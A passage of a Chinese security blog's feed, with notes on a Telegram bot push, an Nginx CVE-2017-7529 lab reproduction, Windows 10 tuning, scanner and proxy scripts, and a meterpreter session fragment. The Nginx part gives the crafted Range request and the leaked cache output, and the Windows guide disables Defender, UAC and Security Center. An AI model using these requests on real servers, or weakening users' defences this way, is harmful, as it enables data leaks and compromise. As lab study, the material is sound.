ETHANHUNTER78BC  192.168.43.26:8080 -&gt; 192.168.43.26:54937 (10.211.55.3)msf6 &gt; sessions -i 1[*] Starting interaction with 1...meterpreter &gt;</code></pre><p>参考：<br><a href="https://mp.weixin.qq.com/s/LOpAu8vs8ob85W3sCmXMew">Cobalt Strike 利用 Chrome 0day 上线 </a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;exp-html-sample&quot;&gt;&lt;a href=&quot;#exp-html-sample&quot; class=&quot;h</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Telegram</title>
    <link href="https://askding.github.io/Tools/Telegram.html"/>
    <id>https://askding.github.io/Tools/Telegram.html</id>
    <published>2021-04-09T04:42:22.000Z</published>
    <updated>2021-04-09T04:42:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>Telegram（非正式簡稱TG）是跨平台的即時通訊软件</p><h2 id="如何通过电报机器人给自己发消息-类似微信公众号推送消息通知"><a href="#如何通过电报机器人给自己发消息-类似微信公众号推送消息通知" class="headerlink" title="如何通过电报机器人给自己发消息(类似微信公众号推送消息通知)"></a>如何通过电报机器人给自己发消息(类似微信公众号推送消息通知)</h2><pre><code class="zsh">curl -X POST &quot;https://api.telegram.org/bot&lt;token&gt;/sendMessage&quot; -d &quot;chat_id=&lt;chat-id&gt;5&amp;text=&lt;message&gt;&quot;</code></pre><p>所需参数</p><ul><li><p><em><token></em>  机器人token 类似于 1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo</p></li><li><p><em><chat-id></em> 会话id 类似于 509654615</p></li><li><p><em><message></em> 推送内容</p></li><li><p><input disabled="" type="checkbox">  创建Telegram机器人 获取Token (任意聊天窗口发送@BotFather，并点击此字符串即可)</p><pre><code class="zsh">/start/newbot &lt;bot_name&gt;         //机器人名字&lt;user_name&gt;_bot    //机器人ID  输入完毕后返回此机器人的Token 《1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo》Done! Congratulations on your new bot. You will find it at t.me/Bili_auto_checkIn_bot. You can now add a description, about section and profile picture for your bot, see /help for a list of commands. By the way, when you&#39;ve finished creating your cool bot, ping our Bot Support if you want a better username for it. Just make sure the bot is fully operational before you do this.  Use this token to access the HTTP API:  1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo  Keep your token secure and store it safely, it can be used by anyone to control your bot.  For a description of the Bot API, see this page: https://core.telegram.org/bots/api</code></pre></li><li><p><input disabled="" type="checkbox">  获取会话id (任意聊天窗口发送@userinfo，并点击此字符串)</p><pre><code class="zsh">    @ethan1Id: 509654615  First: Ethan  Last: Hunter  Lang: en</code></pre></li><li><p><input disabled="" type="checkbox">  curl测试推送内容到机器人</p><pre><code class="zsh">curl -X POST &quot;https://api.telegram.org/bot173220123420:AAGRfRacMKAtFHtM1XSpj477mMFRSONKlPWo/sendMessage&quot; -d &quot;chat_id=509654615&amp;text=https://askding.github.io&quot;&#123;  &quot;ok&quot;: true,   &quot;result&quot;: &#123;      &quot;message_id&quot;: 11,       &quot;from&quot;: &#123;          &quot;id&quot;: 17020603330,           &quot;is_bot&quot;: true,           &quot;first_name&quot;: &quot;Bili&quot;,           &quot;username&quot;: &quot;Bili_checkIn_bot&quot;      &#125;,       &quot;chat&quot;: &#123;          &quot;id&quot;: 5096546232,           &quot;first_name&quot;: &quot;Ethan&quot;,           &quot;last_name&quot;: &quot;Hunter&quot;,           &quot;username&quot;: &quot;et7an&quot;,           &quot;type&quot;: &quot;private&quot;      &#125;,       &quot;date&quot;: 1617958429,       &quot;text&quot;: &quot;https://askding.github.io&quot;,       &quot;entities&quot;: [          &#123;              &quot;offset&quot;: 0,               &quot;length&quot;: 25,               &quot;type&quot;: &quot;url&quot;          &#125;      ]  &#125;&#125;</code></pre></li></ul><p>参考<br><a href="https://zhuanlan.zhihu.com/p/146062288">如何通过电报机器人给自己或群组发消息</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Telegram（非正式簡稱TG）是跨平台的即時通訊软件&lt;/p&gt;
&lt;h2 id=&quot;如何通过电报机器人给自己发消息-</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>Nginx</title>
    <link href="https://askding.github.io/Kali/Exploit/Nginx.html"/>
    <id>https://askding.github.io/Kali/Exploit/Nginx.html</id>
    <published>2021-04-07T12:48:12.000Z</published>
    <updated>2021-04-07T12:48:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Nginx整数溢出漏洞-CVE-2017-7529"><a href="#Nginx整数溢出漏洞-CVE-2017-7529" class="headerlink" title="Nginx整数溢出漏洞 CVE-2017-7529"></a>Nginx整数溢出漏洞 CVE-2017-7529</h1><p>当使用nginx标准模块时，攻击者可以通过发送包含恶意构造 range 域的 header 请求，来获取响应中的缓存文件头部信息。在某些配置中，缓存文件头可能包含后端服务器的IP地址或其它敏感信息，从而导致信息泄露。</p><p>环境搭建参考 <a href="https://github.com/liusec/CVE-2017-7529">CVE-2017-7529</a></p><pre><code class="zsh">docker pull medicean/vulapps:n_nginx_1docker run -d -p 8000:80 medicean/vulapps:n_nginx_1</code></pre><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li><p>Nginx version 0.5.6 - 1.13.2<br>该漏洞影响所有 0.5.6 - 1.13.2版本内默认配置模块的Nginx只需要开启缓存攻击者即可发送恶意请求进行远程攻击造成信息泄露。</p></li><li><p>修复版本 Nginx version 1.13.3, 1.12.1</p></li></ul><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><ul><li>命令行版<pre><code class="zsh">curl -I  http://192.168.43.204:8000/proxy/demo.png -x 127.0.0.1:8080 # 查看文件大小 Content-Length: 16585</code></pre>curl命令用法 请参考<a href="https://askding.github.io/Tools/curl-wget.html">curl-wget</a></li></ul><pre><code class="zsh"></code></pre><p><a href="https://github.com/MaxSecurity/CVE-2017-7529-POC/blob/master/CVE-2017-7529-POC.py">CVE-2017-7259</a></p><h2 id="测试原理"><a href="#测试原理" class="headerlink" title="测试原理"></a>测试原理</h2><p><em>HTTP Range范围请求-响应包</em></p><pre><code class="bash">curl -i   http://192.168.43.204:8000/proxy/demo.png -x 127.0.0.1:8080  -r -17208,-9223372036854758600 </code></pre><pre><code class="http">GET /proxy/demo.png HTTP/1.1                      # HTTP版本必须在1.1及以上版本Host: 192.168.43.204:8000Range: bytes=-17208,-9223372036854758600          # 指定Range字段User-Agent: curl/7.64.1Accept: */*Connection: closeHTTP/1.1 206 Partial Content                     # 表明服务器正确处理了请求并返回Range指定的数据区间Server: nginx/1.13.1Date: Wed, 07 Apr 2021 15:04:48 GMTContent-Type: multipart/byteranges; boundary=00000000000000000025`   # 多个数据区间用multipart/byteranges; boundary标识Connection: closeLast-Modified: Mon, 17 Jul 2017 02:19:08 GMTETag: &quot;40c9-5547a060fdf00&quot;X-Proxy-Cache: HIT--00000000000000000025Content-Type: image/png                          # 指定媒体类型 Content-Range: bytes -623-16584/16585            # 标识返回指定文件的部分内容在整个文件中所处的位置:Ìm`lYâÉm`ä.åä&#123;v&quot;40c9-5547a060fdf00&quot;KEY: httpGET192.168.43.204/proxy/demo.pngHTTP/1.1 200 OKDate: Wed, 07 Apr 2021 15:04:02 GMTServer: Apache/2.4.25 (Debian)Last-Modified: Mon, 17 Jul 2017 02:19:08 GMTETag: &quot;40c9-5547a060fdf00&quot;Accept-Ranges: bytes                           # 表示支持服务器支持范围请求Content-Length: 16585                          # 标识返回指定文件的部分内容在整个文件中所处的位置Content-Type: image/png                        # 指定媒体类型Connection: closePNGIHDRÌ`rB§iCCPICC ProfileHWXSÉ[R    -)¡w¤Wé½H!    J bG\*&quot;XÑUE×È¢&quot;bgìýÊÊºX°¡ò&amp;t&#125;í&#123;&#39;ßÜùsæ3ÿ;@Ñ*Ã/Dù2¤&gt;yøqF,¶0Ï&#39;`@ëÿ.ïnDÜ_³Çú×ñÿ*Ê®%Ja.aQB (Â    M](B (øÿÆHs&amp;*IEND®B`--00000000000000000027Content-Type: image/png                                               # 指定媒体类型Content-Range: bytes -9223372036854742015-16584/16585`                 # 标识返回指定文件的部分内容在整个文件中所处的位置</code></pre><p><em>详解</em></p><ul><li><p><input disabled="" type="checkbox">  状态码</p><ul><li><code>HTTP 206 Partial Content</code>成功状态响应代码表示请求已成功，服务器响应完成且传输了请求指定文件的数据区间，（请求包的 Range 字段指定的，响应包中的<code>Content-Range</code>标识</li><li><code>416 Requested Range Not Satisfiable</code> 表示请求的范围越界（范围值超过了资源的大小）</li><li><code>200 OK</code> 表示服务器不支持范围请求</li></ul></li><li><p><input disabled="" type="checkbox">  HTTP版本要求  需要HTTP/1.1及以上版本支持</p></li><li><p><input disabled="" type="checkbox">  请求包中Range字段 （通过<code>If-Range == ETag</code> 或者 <code>If-Range == Last-Modifled </code>来区分资源文件是否变动，如果源文件有改动，则重新走下载流程）</p><pre><code class="html">Range: bytes=20- ：获取请求中第 20 个字节之后数据；Range: bytes= -50 ：获取请求中最后 50 个字节的数据；Range: bytes=40-100 ：获取请求中第 40 个字节到第 100 个字节之间的数据。Range: bytes=0-50, 100-150  ：获取多个长度的数据</code></pre></li><li><p><input disabled="" type="checkbox">  响应包中对应字段</p><ul><li><code>Accept-Ranges</code>字段要求   <em>Accept-Ranges: bytes</em>字段则表示支持服务器支持范围请求，(不支持范围请求则为<em>Accept-Ranges: none</em>)</li><li><code>Content-Type</code> 说明媒体类型 包含多个数据区间，<code>Content-Type: multipart/byteranges; boundary=0000000xxxx</code></li><li><code>Content-Length</code> 标识指定文件总字节数， </li><li><code>Content-Range</code>标识返回指定文件的部分内容在整个文件中所处的位置</li></ul></li></ul><p>参考<br><a href="https://github.com/liusec/CVE-2017-7529">CVE-2017-7529</a><br><a href="https://github.com/MaxSecurity/CVE-2017-7529-POC">CVE-2017-7529-POC</a><br><a href="https://www.biancheng.net/http/range.html">HTTP range请求</a><br><a href="https://www.anquanke.com/post/id/86421">Nginx range 过滤器整形溢出漏洞</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Nginx整数溢出漏洞-CVE-2017-7529&quot;&gt;&lt;a href=&quot;#Nginx整数溢出漏洞-CVE</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>win10系统优化</title>
    <link href="https://askding.github.io/Evolution/win10%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96.html"/>
    <id>https://askding.github.io/Evolution/win10%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96.html</id>
    <published>2021-03-30T05:09:36.000Z</published>
    <updated>2021-03-30T05:09:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="开启卓越性能"><a href="#开启卓越性能" class="headerlink" title="开启卓越性能"></a>开启卓越性能</h2><p>win+r键输入<code>powershell</code></p><pre><code class="powershell">powercfg -duplicatescheme  e9a42b02-d5df-448d-aa00-03f14749eb61</code></pre><p>【win+r】键输入<code>control</code> 查看方式改为【大图标】，选择【电源选项】-【卓越性能】<br>    【选择电源按钮的功能】-【更改当前不可用的设置】-勾选【启用快速启动】-【保存修改】</p><h2 id="存储感知清理"><a href="#存储感知清理" class="headerlink" title="存储感知清理"></a>存储感知清理</h2><pre><code>打开【设置】-【存储】-【配置存储感知并立即运行】</code></pre><h2 id="关闭视觉效果"><a href="#关闭视觉效果" class="headerlink" title="关闭视觉效果"></a>关闭视觉效果</h2><p>【win+r】运行sysdm.cpl打开【系统属性】面板-【高级系统设置】-标签页【高级】-性能【设置】-【视觉效果】-【最佳性能】</p><h2 id="解除网络限速"><a href="#解除网络限速" class="headerlink" title="解除网络限速"></a>解除网络限速</h2><p>【win+r】输入<code>gpedit.msc</code>,定位到一下路径:<br>【计算机配置】-【管理模版】-【网络】-【QoS数据包计划程序】-《限制可保留带宽》-勾选【已启用】，修改【带宽限制】： 0</p><h2 id="关闭Defender和实时防护"><a href="#关闭Defender和实时防护" class="headerlink" title="关闭Defender和实时防护"></a>关闭Defender和实时防护</h2><p>【win+r】输入<code>gpedit.msc</code>,定位到一下路径:<br>【计算机配置】-【管理模版】-【windows组件】-【windows Defender 防病毒】:<br>              1.  启用【关闭Microsoft Defender防病毒】<br>              2. 【实时防护】-启用【关闭实时防护】</p><h2 id="关闭win10自动更新"><a href="#关闭win10自动更新" class="headerlink" title="关闭win10自动更新"></a>关闭win10自动更新</h2><p>【计算机配置】-【管理模版】-【Windows更新】-禁用【配置自动更新】</p><h2 id="磁盘优化"><a href="#磁盘优化" class="headerlink" title="磁盘优化"></a>磁盘优化</h2><p>右键单击【C盘】-选择【属性】-标签页【工具】-对驱动器进行优化和碎片清理【优化】-【更改设置】</p><h2 id="关闭UAC通知并优化启动引导"><a href="#关闭UAC通知并优化启动引导" class="headerlink" title="关闭UAC通知并优化启动引导"></a>关闭UAC通知并优化启动引导</h2><p>【win+r】输入<code>msconfig</code>-标签页【工具】-【更改UAC设置】-「从不通知」<br>                      -标签页【引导】-勾选【无GUI引导】-应用并确定</p><h2 id="禁用相关服务"><a href="#禁用相关服务" class="headerlink" title="禁用相关服务"></a>禁用相关服务</h2><p>【win+r】键输入<code>services.msc</code> ，查找以下服务并禁用</p><ul><li>【Windows Search】</li><li>【Connected User Experiences and Telemetry】</li><li>【Diagnostic Execution Service】</li><li>【Diagnostic Policy Service】</li><li>【Diagnostic Service Host】</li><li>【Diagnostic System Host】</li><li>【HomeGroup Listener】</li><li>【HomeGroupProvider】</li><li>【SecurityCenter】</li><li>【Program CompatibilityAssistant Service】</li></ul><h2 id="禁用P2P分享服务"><a href="#禁用P2P分享服务" class="headerlink" title="禁用P2P分享服务"></a>禁用P2P分享服务</h2><p>【win+i】键单击【更新与安全】-【传递优化】-关闭【允许从其他电脑下载】</p><h2 id="关闭休眠功能，保留睡眠功能"><a href="#关闭休眠功能，保留睡眠功能" class="headerlink" title="关闭休眠功能，保留睡眠功能"></a>关闭休眠功能，保留睡眠功能</h2><p>【win+x】选择命令行<admin>,执行<code>powercfg -h off</code>,重启后生效</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;开启卓越性能&quot;&gt;&lt;a href=&quot;#开启卓越性能&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
    
    
  </entry>
  
  <entry>
    <title>xray_crawlergo</title>
    <link href="https://askding.github.io/Tools/xray-crawlergo.html"/>
    <id>https://askding.github.io/Tools/xray-crawlergo.html</id>
    <published>2021-03-25T03:58:41.000Z</published>
    <updated>2021-03-25T03:58:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>发现大佬写了<a href="https://github.com/timwhitez/crawlergo_x_XRAY">crawler_x_XRAY</a> 的python版本，于是边写下了sh脚本的版本</p><p><a href="https://github.com/askDing/crawlergo_x_XRAY/blob/master/crawler_xray.sh">crawlergo_x_XRAY.sh</a></p><pre><code class="zsh">#! /bin/bash## File Name: crawler_xray.sh # Author: Mr.Frame# Blog: https://askding.github.io/# Date: Thu Mar 25 10:32:35 CST 2021# Description:#             联动crawlergo和xray# 用法：#    ./crawler_xray.sh   &lt;path/to/target.txt&gt;## 提示:# 需要修改chrome路径thread=50                                 # 定义进程数[ -e /tmp/$$.fifo ] || mkfifo /tmp/$$.fifo # 创建命名管道文件exec 3&lt;&gt; /tmp/$$fifo                      # 创建FD 3，以可读（&lt;）可写（&gt;）的方式关联管道文件，FD 3具有命名管道的特性rm -rf /tmp/$$fifo                        # 删除命名管道文件，通过FD 3echo &quot;./xray_darwin_amd64 webscan --listen 127.0.0.1:7777 --html-output xray-report.html&quot; &amp;&amp; sleep 1.5./xray_darwin_amd64 webscan --listen 127.0.0.1:7777 --html-output xray-report.html &amp;for i in $(seq $thread); do    echo &gt;&amp;3                              # 循环$thread次向FD 3写入\n , 类比一个令牌 doneecho &quot;./crawlergo -c ~/.BurpSuite/burpbrowser/88.0.4324.192/Chromium.app/Contents/MacOS/Chromium  -t 10  -f smart --fuzz-path --push-pool-max 10 --output-mode json --push-to-proxy http://127.0.0.1:7777 Target&quot; &amp;&amp; sleep 1.5while read url; do    read -u 3    (        ./crawlergo -c ~/.BurpSuite/burpbrowser/88.0.4324.192/Chromium.app/Contents/MacOS/Chromium  -t 5  -f smart --fuzz-path --push-pool-max 10 --output-mode json --push-to-proxy http://127.0.0.1:7777 $url    )&amp;    # 最后需要归还令牌    echo &gt;&amp;3                          # 再次向FD 3写入\n , 类似归还令牌done &lt; $1wait                                      # 等待并发进程执行完毕，执行后续命令 if [ $? -eq 0 ]; then    echo &quot;Scan succeed. &quot;else    echo &quot;scan failed &quot;fiexec 3&lt;&amp;-                                 # 关闭FD 3的读exec 3&gt;&amp;-                                 # 关闭FD 3的写</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;发现大佬写了&lt;a href=&quot;https://github.com/timwhitez/crawlergo_x_X</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>java-basic</title>
    <link href="https://askding.github.io/Coding/java-basic.html"/>
    <id>https://askding.github.io/Coding/java-basic.html</id>
    <published>2021-03-21T01:04:43.000Z</published>
    <updated>2021-03-21T01:04:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p> 基础语法及关键字</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h3><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h2 id="流程控制及异常处理"><a href="#流程控制及异常处理" class="headerlink" title="流程控制及异常处理"></a>流程控制及异常处理</h2><h3 id="顺序语句"><a href="#顺序语句" class="headerlink" title="顺序语句"></a>顺序语句</h3><h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><h4 id="if型"><a href="#if型" class="headerlink" title="if型"></a>if型</h4><h4 id="case型"><a href="#case型" class="headerlink" title="case型"></a>case型</h4><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><h4 id="for型"><a href="#for型" class="headerlink" title="for型"></a>for型</h4><h4 id="while型"><a href="#while型" class="headerlink" title="while型"></a>while型</h4><h4 id="until型"><a href="#until型" class="headerlink" title="until型"></a>until型</h4><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><p>类加载过程:</p><ol><li><p>类初始化代码：<br> a. 基类初始化代码<br> b. 子类初始化代码</p></li><li><p>基类实例初始化代码、基类构造方法</p></li><li><p>子类初始化代码、子类构造方法</p></li></ol><h2 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h2><h1 id="进阶知识"><a href="#进阶知识" class="headerlink" title="进阶知识"></a>进阶知识</h1><h2 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h2><h2 id="编程思想"><a href="#编程思想" class="headerlink" title="编程思想"></a>编程思想</h2><h2 id="开源类库"><a href="#开源类库" class="headerlink" title="开源类库"></a>开源类库</h2><h2 id="开源框架"><a href="#开源框架" class="headerlink" title="开源框架"></a>开源框架</h2><h2 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h2><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识</summary>
      
    
    
    
    <category term="Coding" scheme="https://askding.github.io/categories/Coding/"/>
    
    
  </entry>
  
  <entry>
    <title>getHttpProxy</title>
    <link href="https://askding.github.io/Coding/getHttpProxy.html"/>
    <id>https://askding.github.io/Coding/getHttpProxy.html</id>
    <published>2021-03-17T09:12:28.000Z</published>
    <updated>2021-03-17T09:12:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>在github上发现一个自动更新的http代理的仓库<a href="https://github.com/fate0/proxylist">fate0</a></p><p>因此编写了一个python脚本自动获取并添加到proxychains.conf配置文件中</p><p><a href="https://github.com/askDing/socks5_list">getHttp.py</a></p><pre><code class="python">#!/usr/bin/env python3# -*- coding: utf-8 -*-# Wed Mar 17 16:39:04 CST 2021# AUTHOR: Mr.Frame # Description:#      自动获取http代理，并添加到proxychains.conf中#Usage:#      python3 gethttp.py  [/path/to/proxychains.conf]import requestsimport urllib3import jsondef get_socks5(proxychains_path):    &quot;&quot;&quot;    get socks from http://proxylist.fatezero.org/proxy.list.    proxychains_path: str -&gt; the path of proxycahins-ng configuation file.    ***suggestion:   enable  round_robin_chain****    #strict_chain    #dynamic_chain    #round_robin_chain    random_chain    chain_len = 2    &quot;&quot;&quot;    proxychains_file = proxychains_path    url=&quot;http://proxylist.fatezero.org/proxy.list&quot;    headers=&#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;    &#125;    urllib3.disable_warnings() # 关闭ssl警告    try:        response = requests.get(url=url,headers=headers,verify=False,timeout=2)    except Exception as e:        print(&quot;\033[31m[x]Connection failed\033[0m&quot;)        print(e.__str__())        exit()    if response.status_code == 200 :        proxy_list = response.text.splitlines()        socks_list=&quot;\n\n# socks5 list from  http://proxylist.fatezero.org/proxy.list\n&quot;        for item in proxy_list:            item_dict = json.loads(item)            if &quot;http&quot; == item_dict[&#39;type&#39;] and &quot;high_anonymous&quot; == item_dict[&#39;anonymity&#39;]:                socks_item = item_dict[&#39;type&#39;] +&quot;\t&quot; + item_dict[&#39;host&#39;] + &quot;\t&quot; + str(item_dict[&#39;port&#39;])+&quot;\n&quot;                socks_list += socks_item            print(socks_list)        # with open(&quot;/usr/local/etc/proxychains.conf&quot;,&#39;a+&#39;) as f:        with open(proxychains_file,&quot;a+&quot;) as f:            f.write(socks_list)if __name__ == &#39;__main__&#39;:    import sys    if sys.argv.__len__() == 1:        get_socks5(&quot;/usr/local/etc/proxychains.conf&quot;)    else:        get_socks5(sys.argv[1])</code></pre><p>执行脚本后,代理效果不是很好</p><pre><code class="zsh"> proxychains4 curl cip.cc[proxychains] config file found: /usr/local/etc/proxychains.conf[proxychains] preloading /usr/local/Cellar/proxychains-ng/4.14/lib/libproxychains4.dylib[proxychains] DLL init: proxychains-ng 4.14[proxychains] Random chain  ...  222.78.210.229:57186  ...  cip.cc:80  ...  OKIP    : 222.78.210.229地址    : 中国  福建  南平运营商    : 电信数据二    : 福建省南平市 | 电信数据三    : 中国福建省南平市 | 电信URL    : http://www.cip.cc/222.78.210.229</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在github上发现一个自动更新的http代理的仓库&lt;a href=&quot;https://github.com/fat</summary>
      
    
    
    
    <category term="Coding" scheme="https://askding.github.io/categories/Coding/"/>
    
    
  </entry>
  
  <entry>
    <title>Ruijie_RG_UAC</title>
    <link href="https://askding.github.io/Kali/Exploit/Ruijie-RG-UAC.html"/>
    <id>https://askding.github.io/Kali/Exploit/Ruijie-RG-UAC.html</id>
    <published>2021-03-08T07:36:33.000Z</published>
    <updated>2021-03-08T07:36:33.000Z</updated>
    
